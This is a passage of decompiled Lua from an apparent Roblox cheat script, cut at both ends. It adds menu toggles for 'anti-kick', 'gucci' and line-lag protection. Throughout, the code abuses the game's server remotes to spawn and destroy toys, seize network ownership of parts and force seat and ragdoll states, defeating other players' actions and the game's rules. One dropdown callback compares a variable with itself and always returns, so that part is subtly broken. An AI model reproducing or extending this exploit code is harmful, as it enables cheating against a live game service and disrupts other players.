			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				return nil
			end
			return humanoidRootPart.Position
		end

		do
			local function fn19(arg)
				for _, v23 in ipairs(tbl7) do
					if math.abs(arg.X - v23.pos.X) <= 0.5 and math.abs(arg.Y - v23.pos.Y) <= 0.5 and math.abs(arg.Z - v23.pos.Z) <= 0.5 then
						return true
					end
				end

				return false
			end

			local function fn20(parent)
				if parent:FindFirstChild("PlayerNameBillboard") then
					return
				end
				local billboardGui = Instance.new("BillboardGui")
				billboardGui.Name = "PlayerNameBillboard"
				billboardGui.Size = UDim2.new(0, 150, 0, 30)
				billboardGui.StudsOffset = Vector3.new(0, -2.5, 0)
				billboardGui.AlwaysOnTop = true
				billboardGui.Parent = parent
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = "NameLabel"
				textLabel.Size = UDim2.new(1, 0, 1, 0)
				textLabel.BackgroundTransparency = 1
				textLabel.TextStrokeTransparency = 0.3
				textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
				textLabel.Font = Enum.Font.Gotham
				textLabel.TextSize = 14
				textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				textLabel.TextTransparency = 0
				textLabel.Text = string.format("My PCLD [%s]", lp.Name)
				textLabel.Parent = billboardGui
				v21 = billboardGui
			end

			local function fn21()
				if v21 and v21.Parent then
					v21:Destroy()
					v21 = nil
				end
			end

			local function fn22()
				local tbl9 = {}

				for _, descendant in ipairs(ws:GetDescendants()) do
					if descendant:IsA("BasePart") and descendant.Name == str6 then
						table.insert(tbl9, descendant)
					end
				end

				tbl8 = tbl9
			end

			local function fn23()
				if thread5 then
					task.cancel(thread5)
				end

				thread5 = task.spawn(function()
					while flag10 do
						if not v19 then
							for _, v23 in ipairs(tbl8) do
								if v23 and v23.Parent then
									if fn19(v23.Position) then
										tbl6[v23] = (tbl6[v23] or 0) + 1

										if tbl6[v23] >= n26 then
											v19 = v23
											tbl6[v23] = nil
											fn20(v23)
											break
										end
									else
										tbl6[v23] = 0
									end
								end
							end
						end

						task.wait(0)
					end
				end)
			end

			local function fn24()
				if thread5 then
					task.cancel(thread5)
					thread5 = nil
				end

				fn21()
				v19 = nil
				tbl6 = {}
			end

			local function fn25(descendant)
				if descendant:IsA("BasePart") and descendant.Name == str6 then
					table.insert(tbl8, descendant)
				end
			end

			local function fn26(descendant)
				local n28 = #tbl8

				while n28 >= 1 do
					if tbl8[n28] == descendant then
						table.remove(tbl8, n28)
					end

					n28 -= 1
				end

				tbl6[descendant] = nil

				if v19 == descendant then
					fn21()
					v19 = nil
				end
			end

			local function fn27()
				fn21()
				v19 = nil
				tbl6 = {}
				tbl7 = {}
				fn22()
			end

			local function fn28(adornee)
				if not adornee then
					return false
				end
				local soundPart = adornee:FindFirstChild("SoundPart") or adornee:FindFirstChildWhichIsA("BasePart")

				if not soundPart then
					pcall(function()
						if destroyRemote then
							destroyRemote:FireServer(adornee)
						end
					end)

					return false
				end

				local n28 = 0

				while n28 < 12 do
					pcall(function()
						if setNetworkOwner then
							setNetworkOwner:FireServer(soundPart, soundPart.CFrame)
						end
					end)

					task.wait()
					n28 += 1
				end

				for _, descendant in pairs(adornee:GetDescendants()) do
					if descendant:IsA("BasePart") then
						descendant.CanCollide = false
						descendant.CanQuery = false
					end
				end

				if v22 then
					v22:Destroy()
					v22 = nil
				end

				local highlight = Instance.new("Highlight")
				highlight.Adornee = adornee
				highlight.FillTransparency = 1
				highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
				highlight.OutlineTransparency = 0.3
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.Parent = adornee
				v22 = highlight
				return soundPart
			end

			local function fn29()
				for _, v23 in ipairs(tbl5) do
					if v23 and v23.Parent then
						pcall(function()
							if destroyRemote then
								destroyRemote:FireServer(v23)
							end
						end)
					end
				end

				tbl5 = {}
			end

			local function fn30(arg)
				if not arg then
					return
				end
				table.insert(tbl5, arg)

				while #tbl5 > 3 do
					local v23 = table.remove(tbl5, 1)

					if v23 and v23.Parent then
						pcall(function()
							if destroyRemote then
								destroyRemote:FireServer(v23)
							end
						end)
					end
				end
			end

			local function fn31()
				if not v19 or not v19.Parent then
					return nil
				end

				if fn14() then
					return nil
				end

				if canSpawn and not canSpawn.Value then
					return nil
				end
				local cframe = CFrame.new(v19.Position + v32(0, 1, 20))

				task.spawn(function()
					pcall(function()
						spawnRemote:InvokeServer("FoodPlate", cframe, v32(0, 0, 0))
					end)
				end)

				local v23 = ws:FindFirstChild(lp.Name .. "SpawnedInToys")
				local n28 = 0

				while n28 < 8 do
					if v23 then
						for _, child in ipairs(v23:GetChildren()) do
							if child.Name == "FoodPlate" and child ~= v18 then
								local flag14 = false

								for _, v24 in ipairs(tbl5) do
									if v24 == child then
										flag14 = true
										break
									end
								end

								if not flag14 then
									local v24 = fn28(child)

									if v24 then
										v24.CFrame = v19.CFrame * CFrame.Angles(1.5707963267948966, 0, 0)
										v24.AssemblyLinearVelocity = v32(0, 0, 0)
										return child
									end
								end
							end
						end
					end

					task.wait(0.05)
					n28 += 1
				end

				return nil
			end

			local function fn32()
				if thread4 then
					flag12 = false
					task.cancel(thread4)
					thread4 = nil
				end

				if not v19 or not v19.Parent then
					return
				end
				flag12 = true
				fn29()

				thread4 = task.spawn(function()
					while true do
						if flag12 and flag10 and v19 and v19.Parent then
							if fn14() then
								flag12 = false
								fn29()
								break
							else
								local humanoidRootPart = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
								local v23

								if humanoidRootPart and v19 then
									if (humanoidRootPart.Position - v19.Position).Magnitude <= 30 then
										flag12 = false
										fn29()
										break
									else
										v23 = fn31()

										if v23 then
											fn30(v23)
										end

										task.wait()
										continue
									end
								else
									v23 = fn31()

									if v23 then
										fn30(v23)
									end

									task.wait()
									continue
								end
							end
						end

						break
					end

					thread4 = nil
				end)
			end

			local function fn33()
				flag12 = false

				if thread4 then
					task.cancel(thread4)
					thread4 = nil
				end

				fn29()
			end

			local function fn34()
				if not v19 or not v19.Parent then
					return false
				end

				if fn14() then
					return false
				end
				local character = lp.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				humanoidRootPart = humanoidRootPart and humanoidRootPart.AssemblyLinearVelocity.Magnitude or 0

				while humanoidRootPart > 400 do
					task.wait(0.05)
					humanoidRootPart = lp.Character
					humanoidRootPart = humanoidRootPart and humanoidRootPart:FindFirstChild("HumanoidRootPart")
					humanoidRootPart = humanoidRootPart and humanoidRootPart.AssemblyLinearVelocity.Magnitude or 0
					if fn14() then
						return false
					end
				end

				if canSpawn and not canSpawn.Value then
					return false
				end
				local cframe = CFrame.new(v19.Position + v32(0, 0, 20))

				task.spawn(function()
					pcall(function()
						spawnRemote:InvokeServer("FoodPlate", cframe, v32(0, 0, 0))
					end)
				end)

				local v23 = nil
				local v24 = ws:FindFirstChild(lp.Name .. "SpawnedInToys")
				local n28 = 0

				while n28 < 20 do
					if v24 then
						for _, child in ipairs(v24:GetChildren()) do
							if child.Name == "FoodPlate" and child ~= v18 then
								v23 = child
								break
							end
						end

						if not v23 then
							task.wait()
							n28 += 1
							continue
						end
					else
						task.wait()
						n28 += 1
						continue
					end

					break
				end

				if not v23 then
					return false
				end
				local v25 = fn28(v23)
				if not v25 then
					return false
				end
				local cFrame = v19.CFrame * CFrame.Angles(1.5707963267948966, 0, 0)
				v25.CFrame = cFrame
				v25.AssemblyLinearVelocity = v32(0, 0, 0)
				v25.CanCollide = false
				v25.CanTouch = false

				if v18 then
					task.spawn(function()
						task.wait()

						if v18 and v18.Parent and v18 ~= v23 then
							pcall(function()
								if destroyRemote then
									destroyRemote:FireServer(v18)
								end
							end)
						end
					end)
				end

				v18 = v23
				v20 = cFrame

				if connection3 then
					connection3:Disconnect()
				end

				connection3 = rs.RenderStepped:Connect(function()
					if not v18 or not v18.Parent then
						return
					end

					if not v19 or not v19.Parent then
						return
					end

					if fn14() then
						return
					end
					local soundPart = v18:FindFirstChild("SoundPart") or v18:FindFirstChildWhichIsA("BasePart")

					if soundPart then
						v20 = v20:Lerp(v19.CFrame * CFrame.Angles(1.5707963267948966, 0, 0), 0.25)
						soundPart.CFrame = v20
						soundPart.AssemblyLinearVelocity = v32(0, 0, 0)
						soundPart.AssemblyAngularVelocity = v32(0, 0, 0)
					end
				end)

				task.spawn(function()
					task.wait(1)
					local v26 = ws:FindFirstChild(lp.Name .. "SpawnedInToys")

					if v26 then
						for _, child in ipairs(v26:GetChildren()) do
							if child.Name == "FoodPlate" and child ~= v18 then
								pcall(function()
									if destroyRemote then
										destroyRemote:FireServer(child)
									end
								end)
							end
						end
					end
				end)

				return true
			end

			local function fn35()
				if connection3 then
					connection3:Disconnect()
					connection3 = nil
				end

				if v18 and v18.Parent then
					local soundPart = v18:FindFirstChild("SoundPart") or v18:FindFirstChildWhichIsA("BasePart")

					if soundPart then
						soundPart.CanCollide = true
						soundPart.CanTouch = true
					end
				end
			end

			local function fn36()
				if not v18 or not v18.Parent then
					return
				end

				if not v19 or not v19.Parent then
					return
				end

				if fn14() then
					return
				end
				local soundPart = v18:FindFirstChild("SoundPart") or v18:FindFirstChildWhichIsA("BasePart")

				if soundPart then
					soundPart.CanCollide = false
					soundPart.CanTouch = false
					local cFrame = v19.CFrame * CFrame.Angles(1.5707963267948966, 0, 0)
					soundPart.CFrame = cFrame
					v20 = cFrame
					soundPart.AssemblyLinearVelocity = v32(0, 0, 0)
					soundPart.AssemblyAngularVelocity = v32(0, 0, 0)
				end

				if connection3 then
					connection3:Disconnect()
				end

				connection3 = rs.RenderStepped:Connect(function()
					if not v18 or not v18.Parent then
						return
					end

					if not v19 or not v19.Parent then
						return
					end

					if fn14() then
						return
					end
					local soundPart2 = v18:FindFirstChild("SoundPart") or v18:FindFirstChildWhichIsA("BasePart")

					if soundPart2 then
						v20 = v20:Lerp(v19.CFrame * CFrame.Angles(1.5707963267948966, 0, 0), 0.25)
						soundPart2.CFrame = v20
						soundPart2.AssemblyLinearVelocity = v32(0, 0, 0)
						soundPart2.AssemblyAngularVelocity = v32(0, 0, 0)
					end
				end)
			end

			local function fn37()
				if thread3 then
					task.cancel(thread3)
				end

				thread3 = task.spawn(function()
					local flag14 = false

					while flag10 do
						task.wait()
						local v23 = fn14()

						if v23 and not flag14 then
							fn35()
							flag14 = true
						elseif not v23 and flag14 then
							fn36()
							flag14 = false
						end

						if v23 then
							if flag12 then
								fn33()
							end

							task.wait()
						else
							if v18 and v18.Parent and not connection3 and not v23 then
								local soundPart = v18:FindFirstChild("SoundPart") or v18:FindFirstChildWhichIsA("BasePart")

								if soundPart and v19 and v19.Parent then
									local cFrame = v19.CFrame * CFrame.Angles(1.5707963267948966, 0, 0)
									soundPart.CFrame = cFrame
									v20 = cFrame

									connection3 = rs.RenderStepped:Connect(function()
										if not v18 or not v18.Parent then
											return
										end

										if not v19 or not v19.Parent then
											return
										end

										if fn14() then
											return
										end
										local soundPart2 = v18:FindFirstChild("SoundPart") or v18:FindFirstChildWhichIsA("BasePart")

										if soundPart2 then
											v20 = v20:Lerp(v19.CFrame * CFrame.Angles(1.5707963267948966, 0, 0), 0.25)
											soundPart2.CFrame = v20
											soundPart2.AssemblyLinearVelocity = v32(0, 0, 0)
											soundPart2.AssemblyAngularVelocity = v32(0, 0, 0)
										end
									end)
								end
							end

							local character = lp.Character
							character = character and character:FindFirstChildOfClass("Humanoid")

							if not character or character.Health <= 0 then
								if connection3 then
									connection3:Disconnect()
									connection3 = nil
								end

								if v18 then
									pcall(function()
										if destroyRemote then
											destroyRemote:FireServer(v18)
										end
									end)

									v18 = nil
								end

								if flag12 then
									fn33()
								end
							else
								if not (not v19 or not v19.Parent) then
									if v18 and v18.Parent then
										local soundPart = v18:FindFirstChild("SoundPart") or v18:FindFirstChildWhichIsA("BasePart")

										if soundPart then
											local partOwner = soundPart:FindFirstChild("PartOwner")

											if partOwner and partOwner.Value ~= "" and partOwner.Value ~= lp.Name then
												pcall(function()
													if destroyRemote then
														destroyRemote:FireServer(v18)
													end
												end)

												v18 = nil
												task.wait()
												local humanoidRootPart = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")

												if humanoidRootPart and v19 then
													if (humanoidRootPart.Position - v19.Position).Magnitude <= 30 then
														task.spawn(fn34)
													else
														fn32()
													end
												else
													fn32()
												end
											end
										end
									end
								end

								if (not v18 or not v18.Parent) and not flag12 then
									local humanoidRootPart = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")

									if humanoidRootPart and v19 then
										if (humanoidRootPart.Position - v19.Position).Magnitude <= 30 then
											task.spawn(fn34)
										else
											fn32()
										end
									else
										task.spawn(fn34)
									end
								end
							end
						end
					end
				end)
			end

			local function fn38()
				flag10 = true
				flag13 = false
				fn27()

				task.spawn(function()
					while flag10 do
						local v23 = fn18()

						if v23 then
							table.insert(tbl7, { pos = v23, time = tick() })
							local now2 = tick()
							local n28 = #tbl7

							while n28 >= 1 do
								if n27 < now2 - tbl7[n28].time then
									table.remove(tbl7, n28)
								end

								n28 -= 1
							end
						end

						task.wait(0)
					end
				end)

				ws.DescendantAdded:Connect(fn25)
				ws.DescendantRemoving:Connect(fn26)
				fn22()
				fn23()
				fn37()
			end

			local function fn39()
				flag10 = false

				if thread3 then
					task.cancel(thread3)
					thread3 = nil
				end

				fn24()

				if flag12 then
					fn33()
				end

				if connection3 then
					connection3:Disconnect()
					connection3 = nil
				end

				if v18 then
					pcall(function()
						if destroyRemote then
							destroyRemote:FireServer(v18)
						end
					end)

					v18 = nil
				end

				if v22 then
					v22:Destroy()
					v22 = nil
				end

				fn21()
				v19 = nil
				tbl6 = {}
				tbl7 = {}
			end

			local function fn40()
				flag8 = false
				flag9 = false
				flag10 = false

				if thread then
					task.cancel(thread)
					thread = nil
				end

				if thread2 then
					task.cancel(thread2)
					thread2 = nil
				end

				if thread3 then
					task.cancel(thread3)
					thread3 = nil
				end

				fn12()
				fn15()
				fn16()
				fn39()
				task.wait(0.2)
			end

			local function fn41()
				if flag8 or flag9 or flag10 then
					return
				end

				if str5 == "Base Shuriken" then
					fn13()
				elseif str5 == "House Shuriken" then
					fn17()
				elseif str5 == "Plate PCLD" then
					fn38()
				end
			end

			antiFunctionsBlock:CreateDropdown({
				Name = "Anti-Kick Method",
				Items = { "Base Shuriken", "House Shuriken", "Plate PCLD" },
				Default = "Base Shuriken",
				Callback = function(arg)
					if not flag7 then
						str5 = arg
						return
					end
					str5 = arg
					if str5 == str5 then
						return
					end
					fn40()
					task.wait(0.3)

					if flag7 then
						fn41()
					end
				end,
			})

			antiFunctionsBlock:CreateToggle({
				Name = "Apply Anti-kick method",
				Default = false,
				Flag = "AntiKickToggle",
				Callback = function(arg)
					flag7 = arg

					if arg then
						fn41()
					else
						fn40()
					end
				end,
			})
		end

		local antiFunctionsBlock2
		antiFunctionsBlock2 = _G.AntiFunctionsBlock
		if not antiFunctionsBlock2 then
			return
		end
		local lp2
		lp2 = _G.LP

		do
			local ws2 = _G.WS
			local repS = _G.RepS
			local cf2 = _G.CF
			local v33 = _G.V3
			local spawnToyRemoteFunction = repS:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
			local destroyToy = repS:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
			local ragdollRemote = repS:FindFirstChild("CharacterEvents") and repS.CharacterEvents:FindFirstChild("RagdollRemote")
			local tbl9 = { RagdollDuration = 3, PostJumpDelay = 0 }
			local v23 = cf2(0, 10000000, 0)
			local activeMethod = "Blobman"

			local function fn19(arg)
				if arg then
					arg.Velocity = v33(0, 0, 0)
					arg.AssemblyLinearVelocity = v33(0, 0, 0)
					arg.RotVelocity = v33(0, 0, 0)
					arg.AssemblyAngularVelocity = v33(0, 0, 0)
				end
			end

			local function fn20(arg)
				if not arg then
					return
				end
				local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")

				if humanoidRootPart then
					fn19(humanoidRootPart)
				end

				for _, v24 in ipairs({ "Head", "Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg" }) do
					local v25 = arg:FindFirstChild(v24)

					if v25 then
						fn19(v25)
					end
				end
			end

			local function fn21()
				pcall(function()
					local character = lp2.Character
					local humanoid = character and character:FindFirstChild("Humanoid")

					if humanoid then
						for i = 1, 5 do
							humanoid.Sit = true
							task.wait(0.005)
							humanoid.Sit = false
						end
					end
				end)
			end

			local tbl10 = {
				Blobman = "CreatureBlobman",
				["Tractor Green"] = "TractorGreen",
				["Tractor Red"] = "TractorRed",
				["Tractor Orange"] = "TractorOrange",
				SantaSleigh = "SantaSleigh",
				Train = "Train",
			}

			local tbl11 = {
				enabled = false,
				thread = nil,
				hasGucci = false,
				isExecuting = false,
				currentObject = nil,
				currentSeat = nil,
				activeMethod = nil,
				spawnedObject = nil,
				isSpawning = false,
				gucciMethod = "Base Gucci [all object]",
			}

			local connection4 = nil
			local connection5 = nil
			local v24 = nil
			local n28 = 0
			local n29 = 0
			local n30 = 0

			local function fn22(arg, anchored)
				if not arg or tbl11.activeMethod == "Train" then
					return
				end

				pcall(function()
					for _, descendant in pairs(arg:GetDescendants()) do
						if descendant:IsA("BasePart") then
							descendant.Anchored = anchored
						end
					end
				end)
			end

			local function fn23(arg)
				local tbl12 = {}
				local v25 = ws2:FindFirstChild(lp2.Name .. "SpawnedInToys")

				if v25 then
					for _, child in pairs(v25:GetChildren()) do
						if child.Name == arg then
							tbl12[child] = true
						end
					end
				end

				return tbl12
			end

			local function fn24(arg)
				if tbl11.activeMethod == "Train" then
					return
				end

				if arg and arg.Parent then
					pcall(function()
						destroyToy:FireServer(arg)
					end)
				end

				if arg == tbl11.currentObject then
					tbl11.currentObject = nil
					tbl11.currentSeat = nil
				end

				if arg == tbl11.spawnedObject then
					tbl11.spawnedObject = nil
				end

				if connection5 then
					connection5:Disconnect()
					connection5 = nil
				end
			end

			local function fn25(arg)
				local v25 = ws2:FindFirstChild(lp2.Name .. "SpawnedInToys")

				if v25 then
					for _, child in pairs(v25:GetChildren()) do
						if child.Name == arg and child.Parent then
							return child
						end
					end
				end

				return nil
			end

			local function fn26()
				if tbl11.activeMethod == "Train" then
					local alwaysHereTweenedObjects = ws2:FindFirstChild("Map") and ws2.Map:FindFirstChild("AlwaysHereTweenedObjects")
					if alwaysHereTweenedObjects then
						return alwaysHereTweenedObjects:FindFirstChild("Train")
					end
					return nil
				end

				if tbl11.currentObject and tbl11.currentObject.Parent then
					return tbl11.currentObject
				end

				if tbl11.spawnedObject and tbl11.spawnedObject.Parent then
					tbl11.currentObject = tbl11.spawnedObject
					return tbl11.spawnedObject
				end
				local v25 = tbl10[tbl11.activeMethod]
				local v26 = fn25(v25)

				if v26 then
					tbl11.spawnedObject = v26
					tbl11.currentObject = v26
					fn22(v26, true)
					return v26
				end

				if tbl11.isSpawning then
					return nil
				end
				local canSpawnToy = lp2:FindFirstChild("CanSpawnToy")

				if canSpawnToy and not canSpawnToy.Value then
					local now2 = tick()

					while not canSpawnToy.Value and tick() - now2 < 3 do
						task.wait()
					end

					if not canSpawnToy.Value then
						return nil
					end
				end

				tbl11.isSpawning = true
				local v27 = fn23(v25)

				task.spawn(function()
					pcall(function()
						spawnToyRemoteFunction:InvokeServer(v25, v23, v33(0, 0, 0))
					end)
				end)

				local v28 = nil

				for i = 1, 40 do
					task.wait()
					local v29 = ws2:FindFirstChild(lp2.Name .. "SpawnedInToys")

					if v29 then
						for _, child in pairs(v29:GetChildren()) do
							if child.Name == v25 and not v27[child] then
								v28 = child
								break
							end
						end
					end

					if not v28 then
						continue
					end
					break
				end

				tbl11.isSpawning = false

				if v28 then
					tbl11.spawnedObject = v28
					tbl11.currentObject = v28
					fn22(v28, true)
					return v28
				end

				return nil
			end

			local function fn27(parent)
				if tbl11.activeMethod ~= "Blobman" then
					return
				end

				pcall(function()
					local vehicleSeat = parent and parent:FindFirstChild("VehicleSeat")
					if not vehicleSeat then
						return
					end

					for i = 1, 3 do
						vehicleSeat.Parent = repS
						task.wait(0.15)
						vehicleSeat.Parent = parent
						task.wait(0.1)
					end
				end)
			end

			local function fn28(arg, arg2, arg3, arg4, arg5)
				tbl11.isExecuting = true
				local cFrame = arg2.CFrame
				fn22(arg4, false)
				arg2.CFrame = arg5.CFrame * cf2(0, 2, 0)
				fn19(arg2)
				arg5:Sit(arg3)

				task.spawn(function()
					local ragdollDuration = tbl9.RagdollDuration
					local n31 = tick() + ragdollDuration

					while tick() < n31 and tbl11.isExecuting do
						if ragdollRemote then
							pcall(function()
								ragdollRemote:FireServer(arg2, 0)
							end)
						end

						task.wait()
					end
				end)

				local n31 = tick() + 3

				while arg5.Occupant ~= arg3 and tick() < n31 do
					arg5:Sit(arg3)
					task.wait()
				end

				if arg5.Occupant == arg3 then
					arg3:ChangeState(Enum.HumanoidStateType.Jumping)
					task.wait(tbl9.PostJumpDelay)
				end

				local n32 = tick() + 2

				while arg3.SeatPart and tick() < n32 do
					task.wait()
				end

				if cFrame then
					arg2.CFrame = cFrame
					fn20(arg)
				end

				if ragdollRemote then
					pcall(function()
						ragdollRemote:FireServer(arg2, 1)
					end)
				end

				if arg4 and arg4.Parent then
					fn22(arg4, true)

					if tbl11.activeMethod ~= "Train" then
						arg4:PivotTo(v23)
					end
				end

				pcall(function()
					if arg3.SeatPart then
						arg3.Sit = false
					end
				end)

				fn27(arg4)
				task.wait(0.2)
				local ragdolled = arg3:FindFirstChild("Ragdolled")

				if not (ragdolled and ragdolled.Value == true) then
					tbl11.hasGucci = true
					tbl11.isExecuting = false

					if tbl11.gucciMethod == "Ghost [Astral Gucci] no grab" and tbl11.activeMethod ~= "Train" then
						fn24(arg4)
					end
				else
					tbl11.hasGucci = false
					tbl11.isExecuting = false
				end
			end

			local function fn29(arg, arg2)
				if connection4 then
					connection4:Disconnect()
				end

				connection4 = arg2:GetPropertyChangedSignal("SeatPart"):Connect(function()
					if not tbl11.enabled or tbl11.isExecuting then
						return
					end

					if arg2.SeatPart then
						tbl11.hasGucci = false

						if arg2.SeatPart ~= tbl11.currentSeat then
							pcall(function()
								arg2.Sit = false
								arg2:ChangeState(Enum.HumanoidStateType.Jumping)
							end)
						end
					end
				end)
			end

			local function fn30(arg, arg2)
				if connection5 then
					connection5:Disconnect()
				end

				connection5 = arg2:GetPropertyChangedSignal("Occupant"):Connect(function()
					if not tbl11.enabled then
						return
					end
					local occupant = arg2.Occupant
					local character = lp2.Character
					character = character and character:FindFirstChild("Humanoid")

					if occupant and occupant ~= character then
						if occupant.Parent and occupant.Parent.Name ~= lp2.Name then
							fn24(arg)
							tbl11.hasGucci = false
							tbl11.isExecuting = false
							n29 = tick()
							fn21()
						end
					end
				end)
			end

			local function fn31()
				while tbl11.enabled do
					pcall(function()
						if tbl11.isExecuting then
							task.wait(0.1)
						else
							local v25 = activeMethod

							if tbl11.activeMethod ~= v25 then
								tbl11.hasGucci = false
								local currentObject = tbl11.currentObject or tbl11.spawnedObject

								if currentObject then
									fn24(currentObject)
								end

								tbl11.currentObject = nil
								tbl11.currentSeat = nil
								tbl11.spawnedObject = nil
								tbl11.activeMethod = v25
								n30 = tick()
								fn21()
								task.wait(0.1)
							else
								local character = lp2.Character
								local humanoid = character and character:FindFirstChild("Humanoid")
								local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")

								if not character or not humanoid or not humanoidRootPart or humanoid.Health <= 0 then
									tbl11.hasGucci = false
									task.wait(0.1)
								else
									if v24 ~= character then
										tbl11.hasGucci = false
										v24 = character
										fn29(character, humanoid)
									end

									local ragdolled = humanoid:FindFirstChild("Ragdolled")
									ragdolled = ragdolled and ragdolled.Value == true
									local flag14 = false

									if ragdolled then
										tbl11.hasGucci = false
										flag14 = true
									end

									local head = character:FindFirstChild("Head")
									local flag15 = false

									if head then
										local partOwner = head:FindFirstChild("PartOwner")

										if partOwner and partOwner.Value ~= "" and partOwner.Value ~= lp2.Name then
											n28 = tick()
											tbl11.hasGucci = false
											flag15 = true
										end
									end

									if tbl11.currentObject and not tbl11.currentObject.Parent then
										tbl11.currentObject = nil
										tbl11.currentSeat = nil
										tbl11.spawnedObject = nil

										if tbl11.gucciMethod ~= "Ghost [Astral Gucci] no grab" then
											tbl11.hasGucci = false
										end

										fn21()
									end

									if tbl11.spawnedObject and not tbl11.spawnedObject.Parent then
										tbl11.spawnedObject = nil
									end

									if tbl11.hasGucci then
										task.wait(0.1)
									elseif tick() - n29 < 1 or tick() - n30 < 1 then
										task.wait(0.2)
									else
										local currentObject = tbl11.currentObject or fn26()

										if not currentObject or not currentObject.Parent then
											task.wait(0.1)
										else
											tbl11.currentObject = currentObject
											local vehicleSeat

											if tbl11.activeMethod == "Train" then
												vehicleSeat = nil

												for _, descendant in ipairs(currentObject:GetDescendants()) do
													if descendant:IsA("Seat") then
														vehicleSeat = descendant
														break
													else
														vehicleSeat = nil
													end
												end
											elseif tbl11.activeMethod == "SantaSleigh" then
												vehicleSeat = currentObject:FindFirstChildWhichIsA("VehicleSeat", true)
											else
												vehicleSeat = currentObject:FindFirstChild("VehicleSeat")
											end

											if not vehicleSeat then
												task.wait(0.1)
											else
												if tbl11.currentSeat ~= vehicleSeat then
													tbl11.currentSeat = vehicleSeat
													fn30(currentObject, vehicleSeat)
												end

												if not flag14 and not flag15 and tick() - n28 >= 2 then
													if tbl11.activeMethod == "Train" and vehicleSeat.Occupant and vehicleSeat.Occupant ~= humanoid then
														task.wait(0.5)
													else
														fn28(character, humanoidRootPart, humanoid, currentObject, vehicleSeat)
													end
												end

												task.wait(0.1)
											end
										end
									end
								end
							end
						end
					end)
				end
			end

			antiFunctionsBlock2:CreateDropdown({
				Name = "Gucci Object",
				Items = {
					"Blobman",
					"Tractor Green",
					"Tractor Red",
					"Tractor Orange",
					"SantaSleigh",
					"Train",
				},
				Default = "Blobman",
				Callback = function(arg)
					activeMethod = arg

					if tbl11.enabled and tbl11.activeMethod ~= arg then
						tbl11.hasGucci = false
						n30 = tick()
					end
				end,
			})

			antiFunctionsBlock2:CreateDropdown({
				Name = "Gucci Method",
				Items = { "Base Gucci [all object]", "Ghost [Astral Gucci] no grab" },
				Default = "Base Gucci [all object]",
				Callback = function(gucciMethod)
					if tbl11.enabled and tbl11.gucciMethod ~= gucciMethod then
						tbl11.hasGucci = false
						n30 = tick()
						local currentObject = tbl11.currentObject or tbl11.spawnedObject

						if currentObject then
							fn24(currentObject)
						end

						tbl11.currentObject = nil
						tbl11.currentSeat = nil
						tbl11.spawnedObject = nil
						tbl11.activeMethod = nil
						fn21()
					end

					tbl11.gucciMethod = gucciMethod
				end,
			})

			antiFunctionsBlock2:CreateToggle({
				Name = "Enable gucci",
				Default = false,
				Callback = function(enabled)
					tbl11.enabled = enabled

					if enabled then
						tbl11.hasGucci = false
						tbl11.isExecuting = false
						tbl11.currentObject = nil
						tbl11.currentSeat = nil
						tbl11.spawnedObject = nil
						tbl11.isSpawning = false
						tbl11.gucciMethod = tbl11.gucciMethod or "Base Gucci [all object]"
						tbl11.activeMethod = activeMethod
						v24 = nil
						n28 = 0
						n29 = 0
						n30 = tick()

						if tbl11.thread then
							task.cancel(tbl11.thread)
						end

						tbl11.thread = task.spawn(fn31)
					else
						if tbl11.thread then
							task.cancel(tbl11.thread)
							tbl11.thread = nil
						end

						if connection4 then
							connection4:Disconnect()
							connection4 = nil
						end

						if connection5 then
							connection5:Disconnect()
							connection5 = nil
						end

						local currentObject = tbl11.currentObject or tbl11.spawnedObject

						if currentObject then
							fn24(currentObject)
						end

						fn21()
						tbl11.hasGucci = false
						tbl11.isExecuting = false
						tbl11.currentObject = nil
						tbl11.currentSeat = nil
						tbl11.spawnedObject = nil
						tbl11.isSpawning = false
						tbl11.activeMethod = nil
						v24 = nil
					end
				end,
			})
		end

		do
			local antiFunctionsBlock3 = _G.AntiFunctionsBlock
			if not antiFunctionsBlock3 then
				return
			end
			_G.AutoLineLag = _G.AutoLineLag or { enabled = false, isProtectionActive = false, playerData = {}, lastLineTime = 0 }
			local autoLineLag = _G.AutoLineLag
			local connection4 = nil
			local thread6 = nil
			local n28 = 5
			local n29 = 1.5
			local n30 = 6
			local lp3 = _G.LP
			local ps = _G.PS
			local createLine = _G.CreateLine
			local notify = _G.Notify
			local characterAndBeamMove = nil

			local function fn19()
				if not characterAndBeamMove and lp3 then
					local playerScripts = lp3:FindFirstChild("PlayerScripts")

					if playerScripts then
						characterAndBeamMove = playerScripts:FindFirstChild("CharacterAndBeamMove")
					end
				end

				return characterAndBeamMove
			end

			local function fn20()
				pcall(function()
					local v23 = fn19()

					if v23 and v23.Enabled then
						v23.Enabled = false
					end
				end)
			end

			local function fn21()
				pcall(function()
					local v23 = fn19()

					if v23 and not v23.Enabled then
						v23.Enabled = true
					end
				end)
			end

			local function fn22()
				autoLineLag.isProtectionActive = true
				fn20()
			end

			local function fn23()
				autoLineLag.isProtectionActive = false
				fn21()
			end

			local function fn24(arg)
				arg = arg and arg.Character
				if not arg then
					return nil
				end
				local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return nil
				end
				return humanoidRootPart.Position
			end

			local function fn25(arg, arg2)
				if not arg or not arg2 then
					return false
				end
				local position = arg2.Position
				return math.abs(arg.X - position.X) >= 40000 or math.abs(arg.Y - position.Y) >= 40000 or math.abs(arg.Z - position.Z) >= 40000
			end

			local function fn26()
				local now2 = tick()

				for k, v23 in pairs(autoLineLag.playerData) do
					if not v23 or not v23.lastLineTime or now2 - v23.lastLineTime > 3 then
						autoLineLag.playerData[k] = nil
					else
						local n31 = now2 - n29
						local timestamps = {}
						local v24 = ipairs
						local timestamps2 = v23.timestamps or {}

						for _, v25 in v24(timestamps2) do
							if v25 >= n31 then
